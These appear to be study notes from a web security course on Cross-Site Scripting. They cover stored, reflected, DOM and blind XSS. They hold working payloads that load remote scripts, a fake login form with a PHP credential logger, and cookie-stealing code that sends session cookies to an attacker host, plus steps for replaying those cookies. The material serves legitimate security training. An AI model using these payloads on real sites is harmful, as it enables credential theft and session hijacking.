Among the most common types of web application vulnerabilities are [Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) vulnerabilities. XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.
## Summary
#### Stored XSS
The first and most critical type of XSS vulnerability is Stored XSS or Persistent XSS. 

If our injected XSS payload gets stored in the back-end database and retrieved upon visiting the page, this means that our XSS attack is persistent and may affect any user that visits the page.

Test in input fields
```JavaScript
// XSS Payload
<script>alert(window.origin)</script>
```

Upon page refresh, popup should appear with URL of page it is executed on

Verification
	`Ctrl+U`
	or
	Right Click > View Page Source

How to target users?
	As it is persistent, they are exposed when they visit the site
#### Reflected XSS
Non-Persistent
Processed by back-end server

Reflected XSS vulnerabilities occur when our input reaches the back-end server and gets returned to us without being filtered or sanitized.

Example
```JavaScript
// XSS Payload
<script>alert(window.origin)</script>

// output
Task '' could not be added // '' is empty because of <script> tag 
```
Viewing page source reveals error message contains XSS payload

Revisit page? -- error message disappears

How to target users? A synopsis
```JavaScript
// Retrieve request type
CTRL+Shift+I // Developer Tools
Network Tab

// GET Requests
Input XSS Payload from earlier
Click Add to send

// Send URL to user
/index.php?task=<script>alert(window.origin)</script> 
```

#### DOM XSS
Non-Persistent
Processed on client-side through JavaScript

DOM XSS occurs when JavaScript is used to change the page source through the `Document Object Model (DOM)`

Input parameter in URL will be a hashtag #

Source & Sink
	Source = JS Object that takes user input
	Sink = function that writes user input to DOM object. Improper input sanitization leads to XSS

Common JS Functions to write to DOM Objects
```JavaScript
document.write()
DOM.innerHTML
DOM.outerHTML
```

Example
```JavaScript
// Example DOM XSS Payload (cant use <script>)
<img src="" onerror=alert(window.origin)>

// Share URL with user
/#task=<img src="" onerror=alert(window.origin)>
```
## Discovery

#### Automated
Almost all Web Application Vulnerability Scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/)) have various capabilities for detecting all three types of XSS vulnerabilities

Some Open Source Tools
	[XSS Strike](https://github.com/s0md3v/XSStrike)
	[Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
	[XSSer](https://github.com/epsylon/xsser)

#### Manual
[PayloadAllTheThings (XSS)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)

#### Blind XSS Detection
A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to.
	`How would we be able to detect an XSS vulnerability if we cannot see how the output is handled?
	`How can we know which specific field is vulnerable?
	`How can we know what XSS payload to use?

Identifying Blind XSS
```bash
# First, start listener
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80

# Next, we must test payloads that attempt to load a remote script
```
```HTML
<!-- HOW TO INCLUDE REMOTE JS SCRIPT IN HTML -->
<script src="http://OUR_IP/script.js"></script>

<!-- Change name of requested script to name of field we are injecting -->
<script src="http://OUR_IP/field"></script> 
	<!-- once we recieve a request, we know the vulnerable input field -->

<!-- Some example payloads from PayloadsAllTheThings-->
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>

<!-- Next, we start testing payloads until we get a hit -->
<script src=http://OUR_IP/fullname></script> <!--goes inside the full-name field-->
<script src=http://OUR_IP/username></script> <!--goes inside the username field-->
...
```
## XSS Attacks

#### Defacing
Some Examples of Defacing

Changing Background
```JavaScript
// Stored XSS background payload
<script>document.body.style.background = "#141d2b"</script>
```

Changing Page Title
```JavaScript
// Stored XSS title payload
<script>document.title = 'HackTheBox Academy'</script>
```

Changing Page Text
```JavaScript
// Several Ways to modify text
document.getElementById("todo").innerHTML = "New Text"

$("#todo").html('New Text');

document.getElementsByTagName('body')[0].innerHTML = "New Text" // Entire text

// Example Payload
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

#### Phishing
Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject HTML code that displays a login form on the targeted page.

Login Form Injection Attack
```bash
# Set up PHP script to log creds and return victim to original page
mkdir /tmp/tmpserver
cd /tmp/tmpserver/
vim index.php
```
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/path.../"); #replace with normal server path
    fclose($file);
    exit();
}
?>
```
```bash
# Start PHP listening server
sudo php -S 0.0.0.0:80
```
```HTML
<!-- Set up HTML code basic login form (Example) -->
<h3>Please login to continue</h3>
<form action=http://OUR_IP>    <!-- Replace with attack IP -->  
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
```JavaScript
// Minify HTML code into XSS payload (Stored XSS example)
<script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
	// for reflected XSS, send URL (See Refelcted XSS)
	// for DOM XSS, also must send URL (See DOM XSS)

// Cleaning up old fields to make fake login page believable
CTRL+SHIFT+C        // Opens Page Inspector Picker. Click on element to edit
Make note of id      
document.getElementById('<id value goes here (no gators!!!)>').remove();

// Append cleaned up elements to XSS payload
<script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```
```bash
# Catch creds upon user login
cat creds.txt # :)
```

#### Session Hijacking
With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a `Session Hijacking` (aka `Cookie Stealing`) attack.

Session Hijacking
```bash
# Create cookie catcher php script
mkdir /tmp/tmpserver
cd /tmp/tmpserver
vim index.php
```
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
```bash
# Start PHP listening server
sudo php -S 0.0.0.0:80
```
```JavaScript
// Identify a working payload and a vulnerable input field

// Example JS payloads to grab session cookie and send it to us
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie; // less suspicious
```
```bash
# Write JavaSript payload to script.js
cd /tmp/tmpserver
vim script.js

new Image().src='http://OUR_IP/index.php?c='+document.cookie; # replace OUR_IP
```
```HTML
<!-- Change URL in XSS Payload to use script.js-->
<script src=http://OUR_IP/script.js></script>
```
```bash
# Catch Cookies
cat cookies.txt

# Navigate to login page
http://SERVER_IP:PORT/path/to/login.php

# Add Cookie to browser session
Shift+F9    # Storage bar in Developer Tools
Click + button
Add cookie (Name:Value -- cookie:<cookie>)
```
